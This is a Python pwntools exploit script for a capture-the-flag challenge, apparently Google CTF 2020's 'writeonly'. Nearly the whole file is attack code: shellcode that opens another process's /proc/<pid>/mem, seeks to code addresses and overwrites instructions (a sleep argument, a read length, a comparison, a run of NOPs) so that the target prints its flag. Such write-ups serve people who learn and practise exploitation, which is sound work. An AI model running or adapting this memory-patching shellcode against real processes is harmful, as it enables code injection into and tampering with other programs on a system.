#!/usr/bin/python3

from pwn import *
context.log_level = 'debug'
r = process('./chal')
#r = remote('writeonly.2020.ctfcompetition.com', 1337)
#gdb.attach(r)

r.recvuntil(':')
pid = int(r.recvline()[:-1])

context(arch='amd64', os='linux')

sh = ''
sh += shellcraft.open('/proc/{}/mem'.format(pid), 1, 0)

# sleep(1) -> sleep(0x25)
# seek()
sh += 'mov rdi, 3\n'
sh += 'mov rsi, 0x4022da\n'
sh += 'mov rdx, 0\n'
sh += 'push SYS_lseek\n'
sh += 'pop rax\n'
sh += 'syscall'
# write
sh += shellcraft.write(3, 0x48a068, 0x1) # 0x48a068 : 0x25

# read (, , 4) -> read (, , 0x10)
# seek()
sh += 'mov rdi, 3\n'
sh += 'mov rsi, 0x402273\n' # read
sh += 'mov rdx, 0\n'
sh += 'push SYS_lseek\n'
sh += 'pop rax\n'
sh += 'syscall'
# write
sh += shellcraft.write(3, 0x41bd6a, 0x1) # 0x41bd6a : 0x10

# cmp rax, 0x4 -> cmp rax, 0x8
# seek()
sh += 'mov rdi, 3\n'
sh += 'mov rsi, 0x402284\n' # cmp
sh += 'mov rdx, 0\n'
sh += 'push SYS_lseek\n'
sh += 'pop rax\n'
sh += 'syscall'
# write
sh += shellcraft.write(3, 0x41bd6a, 0x1) # 0x41bd6a : 0x10

# nop 0
# seek()
sh += 'mov rdi, 3\n'
sh += 'mov rsi, 0x00402287\n' # 0x0000402287 : lea  rsi,[rip+0x87e23]
sh += 'mov rdx, 0\n'
sh += 'push SYS_lseek\n'
sh += 'pop rax\n'
sh += 'syscall'
# write
sh += shellcraft.write(3, 0x431154, 0x1) # 0x431154 nop

# nop 1
# seek()
sh += 'mov rdi, 3\n'
sh += 'mov rsi, 0x00402288\n' # 0x0000402287 : lea  rsi,[rip+0x87e23]
sh += 'mov rdx, 0\n'
sh += 'push SYS_lseek\n'
sh += 'pop rax\n'
sh += 'syscall'
# write
sh += shellcraft.write(3, 0x431154, 0x1) # 0x431154 nop

# nop 2
# seek()
sh += 'mov rdi, 3\n'
sh += 'mov rsi, 0x00402289\n' # 0x0000402287 : lea  rsi,[rip+0x87e23]
sh += 'mov rdx, 0\n'
sh += 'push SYS_lseek\n'
sh += 'pop rax\n'
sh += 'syscall'
# write
sh += shellcraft.write(3, 0x431154, 0x1) # 0x431154 nop

# nop 3
# seek()
sh += 'mov rdi, 3\n'
sh += 'mov rsi, 0x0040228a\n' # 0x0000402287 : lea  rsi,[rip+0x87e23]
sh += 'mov rdx, 0\n'
sh += 'push SYS_lseek\n'
sh += 'pop rax\n'
sh += 'syscall'
# write
sh += shellcraft.write(3, 0x431154, 0x1) # 0x431154 nop

# nop 4
# seek()
sh += 'mov rdi, 3\n'
sh += 'mov rsi, 0x0040228b\n' # 0x0000402287 : lea  rsi,[rip+0x87e23]
sh += 'mov rdx, 0\n'
sh += 'push SYS_lseek\n'
sh += 'pop rax\n'
sh += 'syscall'
# write
sh += shellcraft.write(3, 0x431154, 0x1) # 0x431154 nop

# nop 5
# seek()
sh += 'mov rdi, 3\n'
sh += 'mov rsi, 0x0040228c\n' # 0x0000402287 : lea  rsi,[rip+0x87e23]
sh += 'mov rdx, 0\n'
sh += 'push SYS_lseek\n'
sh += 'pop rax\n'
sh += 'syscall'
# write
sh += shellcraft.write(3, 0x431154, 0x1) # 0x431154 nop

# nop 6
# seek()
sh += 'mov rdi, 3\n'
sh += 'mov rsi, 0x0040228d\n' # 0x0000402287 : lea  rsi,[rip+0x87e23]
sh += 'mov rdx, 0\n'
sh += 'push SYS_lseek\n'
sh += 'pop rax\n'
sh += 'syscall'
# write
sh += shellcraft.write(3, 0x431154, 0x1) # 0x431154 nop



# sleep(?) -> sleep(0)
# seek()
sh += 'mov rdi, 3\n'
sh += 'mov rsi, 0x4022da\n'
sh += 'mov rdx, 0\n'
sh += 'push SYS_lseek\n'
sh += 'pop rax\n'
sh += 'syscall'
# write
sh += shellcraft.write(3, 0x402292, 0x1) # sleep(0)

# cmp rax, ? -> cmp rax, x
# Call err(1, "CTF{FLLAGGGG..")
# seek()
sh += 'mov rdi, 3\n'
sh += 'mov rsi, 0x402284\n' # cmp
sh += 'mov rdx, 0\n'
sh += 'push SYS_lseek\n'
sh += 'pop rax\n'
sh += 'syscall'
# write
sh += shellcraft.write(3, 0x48a069, 0x1) # 0x25

sh += shellcraft.close(3)


shellcode = asm(sh)

r.sendlineafter('length? ', str(len(shellcode)))
raw_input('>')
r.sendlineafter('shellcode. ', shellcode)

r.interactive()